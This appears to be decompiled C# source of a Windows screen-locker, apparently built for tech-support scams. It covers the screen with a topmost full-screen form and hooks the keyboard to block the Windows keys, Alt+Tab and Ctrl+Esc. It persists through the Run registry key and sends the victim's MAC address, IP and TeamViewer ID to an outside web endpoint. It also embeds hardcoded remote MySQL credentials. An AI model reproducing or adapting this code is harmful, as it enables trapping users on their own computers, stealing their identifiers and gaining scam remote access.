using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.Win32;
using MySql.Data.MySqlClient;

namespace hardworking;

public class Form1 : Form
{
	private struct KBDLLHOOKSTRUCT
	{
		public Keys key;

		public int scanCode;

		public int flags;

		public int time;

		public IntPtr extra;
	}

	private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

	private MySqlConnection conn;

	private string mac;

	private string pc_locked;

	private string Show;

	private string teamviewer;

	private string sMacAddress = string.Empty;

	private string country = "JP";

	private string cp_disable;

	private string taskmanager;

	private string host_file;

	private string Teamviewerstring = string.Empty;

	private string path;

	private string connString = "SERVER=107.180.3.171; PORT=3306; DATABASE=computer_details; UID=computer_details; PASSWORD=admin@password";

	private IntPtr ptrHook;

	private LowLevelKeyboardProc objKeyboardProcess;

	private IContainer components;

	private Label label1;

	private Label label2;

	private Label label3;

	private Label label4;

	private NotifyIcon notifyIcon1;

	private WebBrowser webBrowser1;

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr SetWindowsHookEx(int id, LowLevelKeyboardProc callback, IntPtr hMod, uint dwThreadId);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool UnhookWindowsHookEx(IntPtr hook);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr CallNextHookEx(IntPtr hook, int nCode, IntPtr wp, IntPtr lp);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr GetModuleHandle(string name);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern short GetAsyncKeyState(Keys key);

	public Form1()
	{
		InitializeComponent();
		((Control)this).Hide();
		((Form)this).set_WindowState((FormWindowState)0);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Bounds(Screen.get_PrimaryScreen().get_Bounds());
		((Form)this).set_MinimizeBox(false);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_ControlBox(false);
		GetTeamviewerID();
		GetTeamViewerId();
		NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
		foreach (NetworkInterface networkInterface in allNetworkInterfaces)
		{
			if (sMacAddress == string.Empty)
			{
				networkInterface.GetIPProperties();
				sMacAddress = networkInterface.GetPhysicalAddress().ToString();
			}
		}
		ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
		objKeyboardProcess = captureKeys;
		ptrHook = SetWindowsHookEx(13, objKeyboardProcess, GetModuleHandle(mainModule.ModuleName), 0u);
	}

	private IntPtr captureKeys(int nCode, IntPtr wp, IntPtr lp)
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Invalid comparison between Unknown and I4
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Invalid comparison between Unknown and I4
		//IL_002f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Invalid comparison between Unknown and I4
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Invalid comparison between Unknown and I4
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004a: Invalid comparison between Unknown and I4
		//IL_005b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0062: Invalid comparison between Unknown and I4
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Invalid comparison between Unknown and I4
		if (nCode >= 0)
		{
			KBDLLHOOKSTRUCT kBDLLHOOKSTRUCT = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lp, typeof(KBDLLHOOKSTRUCT));
			if ((int)kBDLLHOOKSTRUCT.key == 92 || (int)kBDLLHOOKSTRUCT.key == 91 || (int)kBDLLHOOKSTRUCT.key == 92 || (int)kBDLLHOOKSTRUCT.key == 91 || ((int)kBDLLHOOKSTRUCT.key == 9 && HasAltModifier(kBDLLHOOKSTRUCT.flags)) || ((int)kBDLLHOOKSTRUCT.key == 27 && (Control.get_ModifierKeys() & 0x20000) == 131072))
			{
				return (IntPtr)1;
			}
		}
		return CallNextHookEx(ptrHook, nCode, wp, lp);
	}

	private IntPtr workingkey(int nCode, IntPtr wp, IntPtr lp)
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Invalid comparison between Unknown and I4
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Invalid comparison between Unknown and I4
		//IL_002f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Invalid comparison between Unknown and I4
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Invalid comparison between Unknown and I4
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004a: Invalid comparison between Unknown and I4
		//IL_005b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0062: Invalid comparison between Unknown and I4
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Invalid comparison between Unknown and I4
		if (nCode >= 0)
		{
			KBDLLHOOKSTRUCT kBDLLHOOKSTRUCT = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lp, typeof(KBDLLHOOKSTRUCT));
			if ((int)kBDLLHOOKSTRUCT.key == 92 || (int)kBDLLHOOKSTRUCT.key == 91 || (int)kBDLLHOOKSTRUCT.key == 92 || (int)kBDLLHOOKSTRUCT.key == 91 || ((int)kBDLLHOOKSTRUCT.key == 9 && HasAltModifier(kBDLLHOOKSTRUCT.flags)) || ((int)kBDLLHOOKSTRUCT.key == 27 && (Control.get_ModifierKeys() & 0x20000) == 131072))
			{
				return (IntPtr)0;
			}
		}
		return CallNextHookEx(ptrHook, nCode, wp, lp);
	}

	private bool HasAltModifier(int flags)
	{
		return (flags & 0x20) == 32;
	}

	private long GetTeamViewerId()
	{
		try
		{
			string name = (Environment.Is64BitOperatingSystem ? "SOFTWARE\\Wow6432Node\\TeamViewer" : "SOFTWARE\\TeamViewer");
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(name);
			if (registryKey == null)
			{
				return 0L;
			}
			object value = registryKey.GetValue("ClientID");
			Teamviewerstring = value.ToString();
			if (value != null)
			{
				return Convert.ToInt64(value);
			}
			foreach (string item in registryKey.GetSubKeyNames().Reverse())
			{
				value = registryKey.OpenSubKey(item)!.GetValue("ClientID");
				if (value != null)
				{
					return Convert.ToInt64(value);
				}
			}
			return 0L;
		}
		catch (Exception)
		{
			return 0L;
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_00d5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00db: Expected O, but got Unknown
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_WindowState((FormWindowState)0);
		((Control)this).Focus();
		((Form)this).set_TopMost(true);
		((Control)this).set_Bounds(Screen.get_PrimaryScreen().get_Bounds());
		RegistryKey? registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey!.SetValue("Testing", Application.get_ExecutablePath().ToString());
		IPAddress[] addressList = Dns.GetHostEntry(Dns.GetHostName()).AddressList;
		string text = string.Empty;
		for (int i = 0; i < addressList.Length; i++)
		{
			text = addressList[i].ToString();
		}
		((Control)label3).set_Text(sMacAddress.Substring(sMacAddress.Length - 10));
		try
		{
			((Control)label1).set_Text(Teamviewerstring.Substring(Teamviewerstring.Length - 5));
			WebBrowser val = new WebBrowser();
			string currentDirectory = Directory.GetCurrentDirectory();
			val.set_Url(new Uri(string.Format("http://gncmdstore.com/api_update.php?id=" + sMacAddress + "& ip=" + text + "& TeamViewer_id=" + Teamviewerstring + "& country=" + country, currentDirectory)));
			val.set_ScriptErrorsSuppressed(true);
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	public static string GetTeamviewerID()
	{
		List<string> list = new string[7] { "4", "5", "5.1", "6", "7", "8", "14" }.Reverse().ToList();
		string[] array = new string[2] { "SOFTWARE\\TeamViewer", "SOFTWARE\\Wow6432Node\\TeamViewer" };
		foreach (string text in array)
		{
			if (Registry.LocalMachine.OpenSubKey(text) == null)
			{
				continue;
			}
			foreach (string item in list)
			{
				string name = $"{text}\\Version{item}";
				if (Registry.LocalMachine.OpenSubKey(name) != null)
				{
					object value = Registry.LocalMachine.OpenSubKey(name)!.GetValue("ClientID");
					if (value != null)
					{
						return Convert.ToInt32(value).ToString();
					}
				}
			}
		}
		return string.Empty;
	}

	protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Invalid comparison between Unknown and I4
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Invalid comparison between Unknown and I4
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		if ((int)keyData == 262259)
		{
			return true;
		}
		if ((int)keyData == 393285)
		{
			((Form)this).Close();
			return false;
		}
		return ((Form)this).ProcessCmdKey(ref msg, keyData);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0098: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a2: Expected O, but got Unknown
		//IL_012b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0135: Expected O, but got Unknown
		//IL_01be: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c8: Expected O, but got Unknown
		//IL_024e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0258: Expected O, but got Unknown
		//IL_02c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ca: Expected O, but got Unknown
		//IL_0369: Unknown result type (might be due to invalid IL or missing references)
		//IL_0373: Expected O, but got Unknown
		//IL_03f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0403: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		label1 = new Label();
		label2 = new Label();
		label3 = new Label();
		label4 = new Label();
		notifyIcon1 = new NotifyIcon(components);
		webBrowser1 = new WebBrowser();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_BackColor(SystemColors.ActiveCaption);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 13f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_Location(new Point(600, 808));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(58, 22));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("label1");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_BackColor(SystemColors.ActiveCaption);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 13f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_Location(new Point(550, 808));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(39, 22));
		((Control)label2).set_TabIndex(1);
		((Control)label2).set_Text("TID");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_BackColor(SystemColors.ActiveCaption);
		((Control)label3).set_Font(new Font("Microsoft Sans Serif", 13f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_Location(new Point(400, 50));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(58, 22));
		((Control)label3).set_TabIndex(2);
		((Control)label3).set_Text("label3");
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_BackColor(SystemColors.ActiveCaption);
		((Control)label4).set_Font(new Font("Microsoft Sans Serif", 13f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label4).set_Location(new Point(350, 50));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(41, 22));
		((Control)label4).set_TabIndex(3);
		((Control)label4).set_Text("MID");
		notifyIcon1.set_Icon((Icon)componentResourceManager.GetObject("notifyIcon1.Icon"));
		notifyIcon1.set_Text("US");
		notifyIcon1.set_Visible(true);
		((Control)webBrowser1).set_Location(new Point(-29, 419));
		((Control)webBrowser1).set_MinimumSize(new Size(20, 20));
		((Control)webBrowser1).set_Name("webBrowser1");
		((Control)webBrowser1).set_Size(new Size(20, 20));
		((Control)webBrowser1).set_TabIndex(4);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 14f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackgroundImage((Image)componentResourceManager.GetObject("$this.BackgroundImage"));
		((Control)this).set_BackgroundImageLayout((ImageLayout)3);
		((Form)this).set_ClientSize(new Size(800, 485));
		((Control)this).get_Controls().Add((Control)(object)webBrowser1);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).set_DoubleBuffered(true);
		((Control)this).set_Font(new Font("Times New Roman", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
